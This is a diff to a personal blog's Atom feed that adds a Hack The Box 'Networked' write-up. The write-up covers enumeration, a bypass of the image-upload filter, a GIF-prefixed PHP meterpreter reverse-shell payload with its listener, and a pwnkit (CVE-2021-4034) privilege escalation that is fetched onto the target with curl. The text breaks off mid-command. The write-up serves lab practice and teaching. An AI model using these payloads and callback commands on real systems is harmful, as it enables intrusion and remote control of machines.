@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2022-06-24T11:34:29-07:00</updated><id>/feed.xml</id><title type="html">Alex Loney</title><subtitle>Computer programming, cyber security, and baking! This blog has it all!</subtitle><author><name>Alex Loney</name></author><entry><title type="html">HTB: Dynstr Writeup</title><link href="/blog/writeup/htb/htb-dynstr/" rel="alternate" type="text/html" title="HTB: Dynstr Writeup" /><published>2021-06-17T23:36:00-07:00</published><updated>2021-06-17T23:36:00-07:00</updated><id>/blog/writeup/htb/htb-dynstr</id><content type="html" xml:base="/blog/writeup/htb/htb-dynstr/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2022-06-30T12:23:49-07:00</updated><id>/feed.xml</id><title type="html">Alex Loney</title><subtitle>Computer programming, cyber security, and baking! This blog has it all!</subtitle><author><name>Alex Loney</name></author><entry><title type="html">HTB: Dynstr Writeup</title><link href="/blog/writeup/htb/htb-dynstr/" rel="alternate" type="text/html" title="HTB: Dynstr Writeup" /><published>2021-06-17T23:36:00-07:00</published><updated>2021-06-17T23:36:00-07:00</updated><id>/blog/writeup/htb/htb-dynstr</id><content type="html" xml:base="/blog/writeup/htb/htb-dynstr/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -283,7 +283,156 @@ bash-5.0# &lt;span class=&quot;nb&quot;&gt;whoami
 bash-5.0#
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Success!!!! We are now root!&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb medium" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">HTB: Knife Writeup</title><link href="/blog/writeup/htb/htb-knife/" rel="alternate" type="text/html" title="HTB: Knife Writeup" /><published>2021-06-13T23:14:00-07:00</published><updated>2021-06-13T23:14:00-07:00</updated><id>/blog/writeup/htb/htb-knife</id><content type="html" xml:base="/blog/writeup/htb/htb-knife/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+&lt;p&gt;Success!!!! We are now root!&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb medium" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">HTB: Networked Writeup</title><link href="/blog/writeup/htb/htb-networked/" rel="alternate" type="text/html" title="HTB: Networked Writeup" /><published>2021-06-17T23:36:00-07:00</published><updated>2021-06-17T23:36:00-07:00</updated><id>/blog/writeup/htb/htb-networked</id><content type="html" xml:base="/blog/writeup/htb/htb-networked/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+&lt;p&gt;This began with an nmap scan&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.10.10.146
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-06-30 14:50 EDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.146
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.69s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 806 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 191 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;host-unreach&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT    STATE  SERVICE VERSION
+22/tcp  open   ssh     OpenSSH 7.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp  open   http    Apache httpd 2.4.6 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/5.4.16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+443/tcp closed https
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 218.17 seconds
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From these ports, the only really interesting one is 80. We also have a bit of info, the machine is running CentOS and PHP 5.4.16.&lt;/p&gt;
+
+&lt;h2 id=&quot;port-80&quot;&gt;Port 80&lt;/h2&gt;
+&lt;p&gt;Beginning with a gobuster scan:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.146 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Gobuster v3.1.0
+by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:                     http://10.10.10.146
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:                  GET
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:                 10
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Negative Status codes:   404
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:              gobuster/3.1.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions:              php
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:                 10s
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2022/06/30 14:59:20 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+/index.php            &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 229]
+/lib.php              &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 0]  
+/uploads              &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 236] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.10.146/uploads/]
+/backup               &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 235] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://10.10.10.146/backup/] 
+/upload.php           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 169]                                   
+/photos.php           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 5980]                                  
+/.                    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 229]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The scan lists a few interesting files, it looks like there’s an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upload.php&lt;/code&gt; that may be of interest to us. Additionally, there’s a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup&lt;/code&gt; directory. Taking a look at the backup directory, I can see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup.tar&lt;/code&gt; listed there, which is the source code of the PHP files!&lt;/p&gt;
+
+&lt;p&gt;Looking through the PHP files, it looks like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upload.php&lt;/code&gt; will receive input from the user as an uploaded file then validate that it’s a valid file with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check_file_type&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;check_file_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;myFile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;filesize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;myFile&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;tmp_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;pre&amp;gt;Invalid image file.&amp;lt;/pre&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nf&quot;&gt;displayform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check_file_type&lt;/code&gt; function will obtain the MIME of the file and check if it contains &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;image/&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_file_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$mime_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;file_mime_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mime_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;image/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next, once the file validates the MIME type, it next checks the file extension:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;list&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getnameUpload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$myFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$validext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;.jpg&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;.png&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;.gif&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;.jpeg&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$valid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$validext&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$vext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr_compare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$myFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$vext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$vext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$valid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So the uploaded file must have one of the image extensions and a valid MIME type.&lt;/p&gt;
+
+&lt;p&gt;From here, I spent a lot of time trying to bypass the file extension check to upload an image with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; extension. I tried many things such as using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jhead&lt;/code&gt; to modify a JPG file and inserting a NULL byte into the uploaded filename (e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.php\x00.jpg&lt;/code&gt;). But I was unable to bypass this file extension filter. After a while of trying on this “easy” box, I finally gave up and look at the ippsec video where he went over the box and he simply uploaded it WITH the image extension, and the webserver still executed it as PHP code. Why didn’t I think of trying to see if the image executed as PHP??&lt;/p&gt;
+
+&lt;p&gt;Next, crafting the payload PHP script:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GIF8;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; payload.php.gif
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; php/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.5 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8080 &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; payload.php.gif
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] No &lt;span class=&quot;nb&quot;&gt;arch &lt;/span&gt;selected, selecting &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 1111 bytes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The above creates a file with the GIF magic number (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GIF8;&lt;/code&gt;), and appends a PHP payload on to the image with a reverse meterpreter payload.&lt;/p&gt;
+
+&lt;p&gt;Next, we must set up a listener to catch the callback when we receive it.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfconsole &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set lhost 10.10.14.5; set lport 8080; run&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Using configured payload generic/shell_reverse_tcp
+payload &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; php/meterpreter/reverse_tcp
+lhost &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.14.5
+lport &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 8080
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.14.5:8080 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sending stage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;39927 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to 10.10.10.146
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Meterpreter session 1 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.14.5:8080 -&amp;gt; 10.10.10.146:36816&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-06-30 14:26:53 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally, uploading the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;payload.php.gif&lt;/code&gt; and then accessing it via the web browser was able to callback to our listener and give us an interactive shell.&lt;/p&gt;
+
+&lt;h1 id=&quot;privesc---user&quot;&gt;Privesc - User&lt;/h1&gt;
+&lt;p&gt;TBD&lt;/p&gt;
+
+&lt;h1 id=&quot;privesc---root&quot;&gt;Privesc - Root&lt;/h1&gt;
+&lt;p&gt;I’m not certain if this is the intended way to obtain root, but when I ran linpeas, it reported that this machine is vulnerable to CVE-2021-4034. That exploit has a &lt;a href=&quot;https://github.com/arthepsy/CVE-2021-4034&quot;&gt;POC posted on github&lt;/a&gt;, however that POC requires compiling with gcc and we do not have gcc on the target machine. That did not pose a problem though, on my local machine I downloaded the POC and compiled it, it does internally use GCC again, so I compiled two versions of it.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc cve-2021-4034-poc.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; cve-2021-4034-poc
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s:execve:// execve:g&apos;&lt;/span&gt; cve-2021-4034-poc.c
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc cve-2021-4034-poc.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; cve-2021-4034-poc-setup
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./cve-2021-4034-poc-setup
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;cf - pwnkit | &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; pwnkit.tgz
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, back in our shell:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
+curl 10.10.14.5/pwnkit.tgz &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; pwnkit.tgz
+&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;xf pwnkit.tgz
